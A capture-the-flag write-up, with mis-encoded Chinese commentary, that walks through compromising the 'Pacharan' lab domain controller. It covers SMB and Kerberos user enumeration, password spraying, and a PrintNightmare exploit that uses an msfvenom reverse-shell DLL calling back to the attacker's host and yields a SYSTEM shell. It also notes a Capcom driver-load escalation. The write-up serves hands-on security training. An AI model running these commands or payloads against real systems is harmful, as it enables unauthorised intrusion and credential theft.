å·²å®Œæˆ 4/4
[*] æ‰«æç»“æŸ,è€—æ—¶: 1.128075052s

â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/thl/Pacharan]
â””â”€# nmap -sC -sV 192.168.69.69
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-04 14:51 CST
Nmap scan report for 192.168.69.69
Host is up (0.00014s latency).
Not shown: 989 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-12-04 13:51:20Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: PACHARAN.THL, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: PACHARAN.THL, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
MAC Address: 08:00:27:7A:01:8C (Oracle VirtualBox virtual NIC)
Service Info: Host: WIN-VRU3GG3DPLJ; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 6h59m57s
|_nbstat: NetBIOS name: WIN-VRU3GG3DPLJ, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 08:00:27:7a:01:8c (Oracle VirtualBox virtual NIC)
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
| smb2-time:
|   date: 2024-12-04T13:51:20
|_  start_date: 2024-12-04T13:48:49

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.06 seconds

<br>åŸŸå PACHARAN.THL<br>
é…ä¸€ä¸‹hsots<br><br>â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/thl/Pacharan]
â””â”€# smbmap -u anonymous -H 192.168.69.69

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
 -----------------------------------------------------------------------------
     SMBMap - Samba Share Enumerator | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB
[*] Established 1 SMB session(s)

[+] IP: 192.168.69.69:445       Name: PACHARAN.THL              Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Admin remota
        C$                                                      NO ACCESS       Recurso predeterminado
        IPC$                                                    READ ONLY       IPC remota
        NETLOGON                                                NO ACCESS       Recurso compartido del servidor de inicio de sesiÃ³n
        NETLOGON2                                               READ ONLY
        PACHARAN                                                NO ACCESS
        PDF Pro Virtual Printer                                 NO ACCESS       Soy Hacker y arreglo impresoras
        print$                                                  NO ACCESS       Controladores de impresora
        SYSVOL                                                  NO ACCESS       Recurso compartido del servidor de inicio de sesiÃ³n
        Users                                                   NO ACCESS
<br>â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/thl/Pacharan]
â””â”€# smbclient -U anonymous   //192.168.69.69/NETLOGON2
Password for [WORKGROUP\anonymous]:
Try "help" to get a list of possible commands.
smb: \&gt; ls
  .                                   D        0  Thu Aug  1 01:25:34 2024
  ..                                  D        0  Thu Aug  1 01:25:34 2024
  Orujo.txt                           A       22  Thu Aug  1 01:25:55 2024

                7735807 blocks of size 4096. 4713743 blocks available
smb: \&gt; get Orujo.txt
getting file \Orujo.txt of size 22 as Orujo.txt (10.7 KiloBytes/sec) (average 10.7 KiloBytes/sec)
smb: \&gt; exit


â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/thl/Pacharan]
â””â”€# cat Orujo.txt
Pericodelospalotes6969   
<br>è·å–åˆ°ä¸¤ä¸ªå…³é”®å­—ç¬¦ä¸²<br>
Pericodelospalotes6969<br>
Orujo<br><br>â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/thl/Pacharan]
â””â”€# kerbrute userenum -d PACHARAN.THL --dc 192.168.69.69 /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt

    __             __               __
   / /_____  _____/ /_  _______  __/ /____
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/

Version: v1.0.3 (9dad6e1) - 12/04/24 - Ronnie Flathers @ropnop

2024/12/04 15:01:42 &gt;  Using KDC(s):
2024/12/04 15:01:42 &gt;   192.168.69.69:88

2024/12/04 15:01:42 &gt;  [+] VALID USERNAME:       chivas@PACHARAN.THL
2024/12/04 15:01:44 &gt;  [+] VALID USERNAME:       hendrick@PACHARAN.THL
2024/12/04 15:01:44 &gt;  [+] VALID USERNAME:       whisky@PACHARAN.THL
2024/12/04 15:01:44 &gt;  [+] VALID USERNAME:       gordons@PACHARAN.THL
2024/12/04 15:01:46 &gt;  [+] VALID USERNAME:       redlabel@PACHARAN.THL
2024/12/04 15:01:47 &gt;  [+] VALID USERNAME:       beefeater@PACHARAN.THL
2024/12/04 15:01:47 &gt;  [+] VALID USERNAME:       Chivas@PACHARAN.THL
2024/12/04 15:01:49 &gt;  [+] VALID USERNAME:       invitado@PACHARAN.THL
2024/12/04 15:02:06 &gt;  [+] VALID USERNAME:       administrador@PACHARAN.THL
2024/12/04 15:06:35 &gt;  [+] VALID USERNAME:       carlosv@PACHARAN.THL
2024/12/04 15:07:19 &gt;  [+] VALID USERNAME:       Whisky@PACHARAN.THL
2024/12/04 15:07:26 &gt;  [+] VALID USERNAME:       RedLabel@PACHARAN.THL
2024/12/04 15:07:41 &gt;  [+] VALID USERNAME:       GordonS@PACHARAN.THL
2024/12/04 15:07:42 &gt;  [+] VALID USERNAME:       GINEBRA@PACHARAN.THL
2024/12/04 15:07:48 &gt;  [+] VALID USERNAME:       CarlosV@PACHARAN.THL
2024/12/04 15:07:49 &gt;  [+] VALID USERNAME:       CHIVAS@PACHARAN.THL
2024/12/04 15:07:50 &gt;  [+] VALID USERNAME:       Beefeater@PACHARAN.THL
2024/12/04 15:08:03 &gt;  Done! Tested 8295455 usernames (17 valid) in 380.478 seconds

â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/thl/Pacharan]
â””â”€# cat kerbrute_users.txt|cut -d ' ' -f14|cut -d '@' -f1&gt;valid_users.txt

â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/thl/Pacharan]
â””â”€# cat valid_users.txt
chivas
hendrick
whisky
gordons
redlabel
beefeater
Chivas
invitado
administrador
carlosv
Whisky
RedLabel
GordonS
GINEBRA
CarlosV
CHIVAS
Beefeater

<br>æŠŠä¸Šé¢è·å–åˆ°çš„å­—ç¬¦ä¸²ä¹ŸåŠ è¿›å» Pericodelospalotes6969 Orujo<br><br>â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/thl/Pacharan]
â””â”€# crackmapexec smb PACHARAN.THL -u valid_users.txt -p valid_users.txt --continue-on-success
SMB         PACHARAN.THL    445    WIN-VRU3GG3DPLJ  [*] Windows 10 / Server 2016 Build 14393 x64 (name:WIN-VRU3GG3DPLJ) (domain:PACHARAN.THL) (signing:True) (SMBv1:False)

SMB         PACHARAN.THL    445    WIN-VRU3GG3DPLJ  [+] PACHARAN.THL\Pericodelospalotes6969:chivas
SMB         PACHARAN.THL    445    WIN-VRU3GG3DPLJ  [+] PACHARAN.THL\Pericodelospalotes6969:hendrick
SMB         PACHARAN.THL    445    WIN-VRU3GG3DPLJ  [+] PACHARAN.THL\Pericodelospalotes6969:whisky
SMB         PACHARAN.THL    445    WIN-VRU3GG3DPLJ  [+] PACHARAN.THL\Pericodelospalotes6969:gordons
SMB         PACHARAN.THL    445    WIN-VRU3GG3DPLJ  [+] PACHARAN.THL\Pericodelospalotes6969:redlabel
SMB         PACHARAN.THL    445    WIN-VRU3GG3DPLJ  [+] PACHARAN.THL\Pericodelospalotes6969:beefeater
SMB         PACHARAN.THL    445    WIN-VRU3GG3DPLJ  [+] PACHARAN.THL\Pericodelospalotes6969:Chivas
SMB         PACHARAN.THL    445    WIN-VRU3GG3DPLJ  [+] PACHARAN.THL\Pericodelospalotes6969:invitado
SMB         PACHARAN.THL    445    WIN-VRU3GG3DPLJ  [+] PACHARAN.THL\Pericodelospalotes6969:administrador
SMB         PACHARAN.THL    445    WIN-VRU3GG3DPLJ  [+] PACHARAN.THL\Pericodelospalotes6969:carlosv
SMB         PACHARAN.THL    445    WIN-VRU3GG3DPLJ  [+] PACHARAN.THL\Pericodelospalotes6969:Whisky
SMB         PACHARAN.THL    445    WIN-VRU3GG3DPLJ  [+] PACHARAN.THL\Pericodelospalotes6969:RedLabel
SMB         PACHARAN.THL    445    WIN-VRU3GG3DPLJ  [+] PACHARAN.THL\Pericodelospalotes6969:GordonS
SMB         PACHARAN.THL    445    WIN-VRU3GG3DPLJ  [+] PACHARAN.THL\Pericodelospalotes6969:GINEBRA
SMB         PACHARAN.THL    445    WIN-VRU3GG3DPLJ  [+] PACHARAN.THL\Pericodelospalotes6969:CarlosV
SMB         PACHARAN.THL    445    WIN-VRU3GG3DPLJ  [+] PACHARAN.THL\Pericodelospalotes6969:CHIVAS
SMB         PACHARAN.THL    445    WIN-VRU3GG3DPLJ  [+] PACHARAN.THL\Pericodelospalotes6969:Beefeater
SMB         PACHARAN.THL    445    WIN-VRU3GG3DPLJ  [+] PACHARAN.THL\Pericodelospalotes6969:Pericodelospalotes6969
SMB         PACHARAN.THL    445    WIN-VRU3GG3DPLJ  [+] PACHARAN.THL\Pericodelospalotes6969:Orujo
SMB         PACHARAN.THL    445    WIN-VRU3GG3DPLJ  [-] PACHARAN.THL\Orujo:chivas STATUS_LOGON_FAILURE
SMB         PACHARAN.THL    445    WIN-VRU3GG3DPLJ  [-] PACHARAN.THL\Orujo:hendrick STATUS_LOGON_FAILURE
SMB         PACHARAN.THL    445    WIN-VRU3GG3DPLJ  [-] PACHARAN.THL\Orujo:whisky STATUS_LOGON_FAILURE
SMB         PACHARAN.THL    445    WIN-VRU3GG3DPLJ  [-] PACHARAN.THL\Orujo:gordons STATUS_LOGON_FAILURE
SMB         PACHARAN.THL    445    WIN-VRU3GG3DPLJ  [-] PACHARAN.THL\Orujo:redlabel STATUS_LOGON_FAILURE
SMB         PACHARAN.THL    445    WIN-VRU3GG3DPLJ  [-] PACHARAN.THL\Orujo:beefeater STATUS_LOGON_FAILURE
SMB         PACHARAN.THL    445    WIN-VRU3GG3DPLJ  [-] PACHARAN.THL\Orujo:Chivas STATUS_LOGON_FAILURE
SMB         PACHARAN.THL    445    WIN-VRU3GG3DPLJ  [-] PACHARAN.THL\Orujo:invitado STATUS_LOGON_FAILURE
SMB         PACHARAN.THL    445    WIN-VRU3GG3DPLJ  [-] PACHARAN.THL\Orujo:administrador STATUS_LOGON_FAILURE
SMB         PACHARAN.THL    445    WIN-VRU3GG3DPLJ  [-] PACHARAN.THL\Orujo:carlosv STATUS_LOGON_FAILURE
SMB         PACHARAN.THL    445    WIN-VRU3GG3DPLJ  [-] PACHARAN.THL\Orujo:Whisky STATUS_LOGON_FAILURE
SMB         PACHARAN.THL    445    WIN-VRU3GG3DPLJ  [-] PACHARAN.THL\Orujo:RedLabel STATUS_LOGON_FAILURE
SMB         PACHARAN.THL    445    WIN-VRU3GG3DPLJ  [-] PACHARAN.THL\Orujo:GordonS STATUS_LOGON_FAILURE
SMB         PACHARAN.THL    445    WIN-VRU3GG3DPLJ  [-] PACHARAN.THL\Orujo:GINEBRA STATUS_LOGON_FAILURE
SMB         PACHARAN.THL    445    WIN-VRU3GG3DPLJ  [-] PACHARAN.THL\Orujo:CarlosV STATUS_LOGON_FAILURE
SMB         PACHARAN.THL    445    WIN-VRU3GG3DPLJ  [-] PACHARAN.THL\Orujo:CHIVAS STATUS_LOGON_FAILURE
SMB         PACHARAN.THL    445    WIN-VRU3GG3DPLJ  [-] PACHARAN.THL\Orujo:Beefeater STATUS_LOGON_FAILURE
SMB         PACHARAN.THL    445    WIN-VRU3GG3DPLJ  [+] PACHARAN.THL\Orujo:Pericodelospalotes6969
SMB         PACHARAN.THL    445    WIN-VRU3GG3DPLJ  [-] PACHARAN.THL\Orujo:Orujo STATUS_LOGON_FAILURE


<br>å¯ä»¥çœ‹åˆ° Pericodelospalotes6969 ç”¨æˆ·æ˜¯ä¸éœ€è¦å¯†ç çš„<br>
å°è¯•åˆ©ç”¨ evil-winrm ç™»å½•è¯¥ç”¨æˆ· <br>â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/thl/Pacharan]
â””â”€# evil-winrm -i 192.168.69.69 -u Pericodelospalotes6969 -p Per

Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

Error: An error of type WinRM::WinRMAuthorizationError happened, message is WinRM::WinRMAuthorizationError

Error: Exiting with code 1

<br>å¤±è´¥äº†<br>è¿˜æœ‰ä¸€ä¸ªç”¨æˆ·<br>
Orujo ï¼šPericodelospalotes6969 <br>â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/thl/Pacharan]
â””â”€# evil-winrm -i 192.168.69.69 -u Orujo -p Pericodelospalotes6969

Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

Error: An error of type WinRM::WinRMAuthorizationError happened, message is WinRM::WinRMAuthorizationError

Error: Exiting with code 1

<br>å¥½å§ä¹Ÿä¸è¡Œ<br><br>çœ‹ä¸€ä¸‹Orujoç”¨æˆ·çš„smbå…±äº«<br>â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/thl/Pacharan]
â””â”€# smbmap -u Orujo -p Pericodelospalotes6969 -H 192.168.69.69

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
 -----------------------------------------------------------------------------
     SMBMap - Samba Share Enumerator | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB
[*] Established 1 SMB session(s)

[+] IP: 192.168.69.69:445       Name: PACHARAN.THL              Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Admin remota
        C$                                                      NO ACCESS       Recurso predeterminado
        IPC$                                                    READ ONLY       IPC remota
        NETLOGON                                                READ ONLY       Recurso compartido del servidor de inicio de sesiÃ³n
        NETLOGON2                                               NO ACCESS
        PACHARAN                                                READ ONLY
        PDF Pro Virtual Printer                                 NO ACCESS       Soy Hacker y arreglo impresoras
        print$                                                  NO ACCESS       Controladores de impresora
        SYSVOL                                                  NO ACCESS       Recurso compartido del servidor de inicio de sesiÃ³n
        Users                                                   NO ACCESS

<br>â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/thl/Pacharan]
â””â”€# smbclient -U Orujo  //192.168.69.69/PACHARAN
Password for [WORKGROUP\Orujo]:
Try "help" to get a list of possible commands.
smb: \&gt; ls
  .                                   D        0  Thu Aug  1 01:21:13 2024
  ..                                  D        0  Thu Aug  1 01:21:13 2024
  ah.txt                              A      921  Thu Aug  1 01:20:16 2024

                7735807 blocks of size 4096. 4712894 blocks available
â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/thl/Pacharan]
â””â”€# cat ah.txt
Mamasoystreamer1!
Mamasoystreamer2@
Mamasoystreamer3#
Mamasoystreamer4$
Mamasoystreamer5%
Mamasoystreamer6^
Mamasoystreamer7&amp;
Mamasoystreamer8*
Mamasoystreamer9(
Mamasoystreamer10)
MamasoyStreamer11!
MamasoyStreamer12@
MamasoyStreamer13#
MamasoyStreamer14$
MamasoyStreamer15%
MamasoyStreamer16^
MamasoyStreamer17&amp;
MamasoyStreamer18*
MamasoyStreamer19(
MamasoyStreamer20)
MamaSoyStreamer1!
MamaSoyStreamer2@
MamaSoyStreamer3#
MamaSoyStreamer4$
MamaSoyStreamer5%
MamaSoyStreamer6^
MamaSoyStreamer7&amp;
MamaSoyStreamer8*
MamaSoyStreamer9(
MamaSoyStreamer10)
MamasoyStream1er!
MamasoyStream2er@
MamasoyStream3er#
MamasoyStream4er$
MamasoyStream5er%
MamasoyStream6er^
MamasoyStream7er&amp;
MamasoyStream8er*
MamasoyStream9er(
MamasoyStream10er)
MamasoyStr1amer!
MamasoyStr2amer@
MamasoyStr3amer#
MamasoyStr4amer$
MamasoyStr5amer%
MamasoyStr6amer^
MamasoyStr7amer&amp;
MamasoyStr8amer*
MamasoyStr9amer(
MamasoyStr10amer)
Mamasoystreamer1

<br>çœ‹è¿™åƒæ˜¯ä¸€ä¸ªå¯†ç è¡¨<br><br>â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/thl/Pacharan]
â””â”€# crackmapexec smb PACHARAN.THL -u valid_users.txt -p ah.txt --continue-on-success |grep +
SMB         PACHARAN.THL    445    WIN-VRU3GG3DPLJ  [+] PACHARAN.THL\whisky:MamasoyStream2er@
SMB         PACHARAN.THL    445    WIN-VRU3GG3DPLJ  [+] PACHARAN.THL\Whisky:MamasoyStream2er@

<br>æˆåŠŸè·å–åˆ°äº† Whisky ç”¨æˆ·çš„å¯†ç <br>
å°è¯•evil -winrmç™»å½•<br>
â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/thl/Pacharan]
â””â”€# evil-winrm -i 192.168.69.69 -u 'Whisky' -p 'MamasoyStream2er@'

Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

Error: An error of type WinRM::WinRMAuthorizationError happened, message is WinRM::WinRMAuthorizationError

Error: Exiting with code 1

<br>åˆå¤±è´¥äº†<br>æ‰çœ‹ä¸‹ Whisky ç”¨æˆ·çš„smbå…±äº«<br>â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/thl/Pacharan]
â””â”€# smbmap -u Whisky -p MamasoyStream2er@ -H 192.168.69.69

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
 -----------------------------------------------------------------------------
     SMBMap - Samba Share Enumerator | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB
[*] Established 1 SMB session(s)
[/] Auth[!] Unable to remove test file at \\192.168.69.69\PDF Pro Virtual Printer\LBJIFVWHAS.txt, please remove manually

[+] IP: 192.168.69.69:445       Name: PACHARAN.THL              Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Admin remota
        C$                                                      NO ACCESS       Recurso predeterminado
        IPC$                                                    READ ONLY       IPC remota
        NETLOGON                                                READ ONLY       Recurso compartido del servidor de inicio de sesiÃ³n
        NETLOGON2                                               NO ACCESS
        PACHARAN                                                NO ACCESS
        PDF Pro Virtual Printer                                 NO ACCESS       Soy Hacker y arreglo impresoras
        print$                                                  NO ACCESS       Controladores de impresora
        SYSVOL                                                  NO ACCESS       Recurso compartido del servidor de inicio de sesiÃ³n
        Users                                                   NO ACCESS

<br>æ²¡æœ‰å•¥ä¸œè¥¿å•Š<br>åˆ©ç”¨ Whisky ç”¨æˆ·çš„æƒé™è¿›è¡Œ rid-brute æ”¶é›†åŸŸå†…ç”¨æˆ·<br>
â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/thl/Pacharan]
â””â”€# crackmapexec smb PACHARAN.THL -u Whisky -p MamasoyStream2er@ --rid-brute &gt;rid-brute.txt

â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/thl/Pacharan]
â””â”€# wc -l rid-brute.txt
40 rid-brute.txt

â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/thl/Pacharan]
â””â”€# cat rid-brute.txt |grep SidTypeUser |cut -d ' ' -f21|cut -d '\' -f2 &gt;valid_users.txt

â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/thl/Pacharan]
â””â”€# cat valid_users.txt
Administrador
Invitado
krbtgt
DefaultAccount
WIN-VRU3GG3DPLJ$
Orujo
Ginebra
Whisky
Hendrick
Chivas
Whisky2
JB
Chivas
beefeater
CarlosV
RedLabel
Gordons
<br>æŸ¥çœ‹æ‰“å°æœº<br>â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/thl/Pacharan]
â””â”€# rpcclient -U "Whisky%MamasoyStream2er@" 192.168.69.69 -c 'enumprinters'
        flags:[0x800000]
        name:[\\192.168.69.69\Soy Hacker y arreglo impresoras]
        description:[\\192.168.69.69\Soy Hacker y arreglo impresoras,Universal Document Converter,TurkisArrusPuchuchuSiu1]
        comment:[Soy Hacker y arreglo impresoras]

<br>è·å–åˆ°ä¸€ä¸ªå¯†ç  TurkisArrusPuchuchuSiu1<br>
å¯†ç å–·æ¶‚è¯•è¯•<br>â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/thl/Pacharan]
â””â”€# crackmapexec smb PACHARAN.THL -u valid_users.txt -p TurkisArrusPuchuchuSiu1 --continue-on-success |grep +
SMB         PACHARAN.THL    445    WIN-VRU3GG3DPLJ  [+] PACHARAN.THL\Chivas Regal:TurkisArrusPuchuchuSiu1

<br>Evil-winrmç™»å½•<br>â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/thl/Pacharan]
â””â”€# evil-winrm -i 192.168.69.69 -u 'Chivas Regal' -p 'TurkisArrusPuchuchuSiu1'

Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

<br><br>åœ¨åˆ©ç”¨smbæ£€æµ‹æ—¶æˆ‘ä»¬çœ‹åˆ°å­˜åœ¨ä¸€å°æ‰“å°æœºï¼Œé‚£æˆ‘ä»¬å¯ä»¥å°è¯•åˆ©ç”¨ç›¸å…³æ¼æ´<br>
<a data-tooltip-position="top" aria-label="../../20-ç½‘å®‰/28-CVEå¤ç°/CVE-2021-34527" data-href="../../20-ç½‘å®‰/28-CVEå¤ç°/CVE-2021-34527" href="https://www.c1trus.top/20-ç½‘å®‰/28-cveå¤ç°/cve-2021-34527.html" class="internal-link" target="_self" rel="noopener nofollow">CVE-2021-34527</a> ä¹Ÿå« PrintNightmareæ¼æ´<br>åˆ©ç”¨è„šæœ¬ <a rel="noopener nofollow" class="external-link" href="https://github.com/JohnHammond/CVE-2021-34527" target="_blank">https://github.com/JohnHammond/CVE-2021-34527</a><br>
è¿™é‡Œåªæ˜¯wp æˆ‘ç›´æ¥è®²å¦‚ä½•åš<br>
å…ˆæ£€æŸ¥ä¸€ä¸‹æ‰“å°æœºç›¸å…³çš„åè®®æ˜¯å¦è¿è¡Œ<br>â”Œâ”€â”€(kaliã‰¿kali)-[~/thl/Pacharan]
â””â”€$ impacket-rpcdump @192.168.69.69 | grep -E 'MS-RPRN|MS-PAR'
Protocol: [MS-RPRN]: Print System Remote Protocol
Protocol: [MS-PAR]: Print System Asynchronous Remote Protocol

<br>å¾ˆå¥½ è¿™ä¸¤ä¸ªåè®®éƒ½åœ¨è¿è¡Œ<br>ç„¶åç”¨msfç”Ÿæˆä¸€ä¸ªåå‘dll ç„¶åä¸Šä¼ ä¸Šå»<br>msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.69.3 lport=4455 -f dll -o reverse.dll
<br>å¤åˆ¶åˆ°ä¸€ä¸ªwindowsä¸‹é»˜è®¤å¯å†™çš„ç›®å½•ä¸‹ã€‚å…·ä½“çš„å¯ä»¥çœ‹è¿™é‡Œ<a rel="noopener nofollow" class="external-link" href="https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/Generic-AppLockerbypasses.md" target="_blank">https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/Generic-AppLockerbypasses.md</a><br>*Evil-WinRM* PS C:\Users\Chivas Regal\Documents&gt; cp reverse.dll  C:\Windows\Tasks\reverse.dll
<br>åŠ è½½æ¼æ´åˆ©ç”¨æ¨¡å— ç„¶åæ‰§è¡Œdll åå¼¹shell<br>*Evil-WinRM* PS C:\Users\Chivas Regal\Documents&gt; upload /home/kali/thl/Pacharan/CVE-2021-34527.ps1

Info: Uploading /home/kali/thl/Pacharan/CVE-2021-34527.ps1 to C:\Users\Chivas Regal\Documents\CVE-2021-34527.ps

Data: 238084 bytes of 238084 bytes copied

Info: Upload successful!
*Evil-WinRM* PS C:\Users\Chivas Regal\Documents&gt; ls


    Directorio: C:\Users\Chivas Regal\Documents


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        12/4/2024   3:53 PM         295936 6666.exe
-a----        12/4/2024   8:42 PM         178563 CVE-2021-34527.ps1
-a----        12/4/2024   8:26 PM           9216 reverse.dll


*Evil-WinRM* PS C:\Users\Chivas Regal\Documents&gt; Import-Module .\CVE-2021-34527.ps1

nc -lvnp 4455

Invoke-Nightmare -DLL 'C:\Windows\Tasks\reverse.dll'
<br>ç„¶åå°±å¯ä»¥è·å–åˆ°ç³»ç»Ÿç”¨æˆ·çš„shelläº†<br>â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/thl/Pacharan]
â””â”€# nc -lvnp 4455
listening on [any] 4455 ...
connect to [192.168.69.3] from (UNKNOWN) [192.168.69.69] 49194
Microsoft Windows [Versiâ–’n 10.0.14393]
(c) 2016 Microsoft Corporation. Todos los derechos reservados.

C:\Windows\system32&gt;whoami
whoami
nt authority\system

C:\Windows\system32&gt;
<br>c:\Users\Chivas Regal\Desktop&gt;type user.txt
type user.txt
bb8b4df8eda73e75ca51ca88a909c1cb  -


c:\Users\Administrador\Desktop&gt;type root.txt
type root.txt
cfa7cb1cc20e26c0428f9222d44c76a0  -

<br><br>æŸ¥çœ‹æƒé™æ—¶å¯ä»¥çœ‹åˆ°æˆ‘ä»¬æœ‰ <a data-tooltip-position="top" aria-label="../æ¸—é€å§¿åŠ¿åº“/SeLoadDriverPrivilege" data-href="../æ¸—é€å§¿åŠ¿åº“/SeLoadDriverPrivilege" href="https://www.c1trus.top/24-æ¸—é€/æ¸—é€å§¿åŠ¿åº“/seloaddriverprivilege.html" class="internal-link" target="_self" rel="noopener nofollow">SeLoadDriverPrivilege</a>æƒé™<br>
è¯¥æƒé™å…è®¸ç”¨æˆ·æˆ–è¿›ç¨‹åœ¨ç³»ç»Ÿä¸ŠåŠ è½½å’Œå¸è½½è®¾å¤‡é©±åŠ¨ç¨‹åºã€‚<br>
é€šå¸¸ï¼Œåªæœ‰ç®¡ç†å‘˜æˆ–å—ä¿¡ä»»çš„ç³»ç»Ÿè¿›ç¨‹æ‰ä¼šè¢«æˆäºˆæ­¤æƒé™<br>*Evil-WinRM* PS C:\Users\Chivas Regal\Documents&gt; whoami /priv

INFORMACIÃ N DE PRIVILEGIOS
--------------------------

Nombre de privilegio          DescripciÂ¢n                                     Estado
============================= =============================================== ==========
SeMachineAccountPrivilege     Agregar estaciones de trabajo al dominio        Habilitada
SeLoadDriverPrivilege         Cargar y descargar controladores de dispositivo Habilitada
SeChangeNotifyPrivilege       Omitir comprobaciÂ¢n de recorrido                Habilitada
SeIncreaseWorkingSetPrivilege Aumentar el espacio de trabajo de un proceso    Habilitada

<br>ç„¶åå¯ä»¥ä»<a data-tooltip-position="top" aria-label="https://github.com/k4sth4/SeLoadDriverPrivilege" rel="noopener nofollow" class="external-link" href="https://github.com/k4sth4/SeLoadDriverPrivilege" target="_blank">è¿™é‡Œ</a> è·å–åˆ°æ¼æ´åˆ©ç”¨çš„ç›¸å…³å·¥å…·<br>ä¸Šä¼ ç›¸å…³å·¥å…·ï¼š
*Evil-WinRM* PS C:\Users\Chivas Regal\Documents&gt; upload /home/kali/thl/Pacharan/ExploitCapcom.exe

Info: Uploading /home/kali/thl/Pacharan/ExploitCapcom.exe to C:\Users\Chivas Regal\Documents\ExploitCapcom.exe

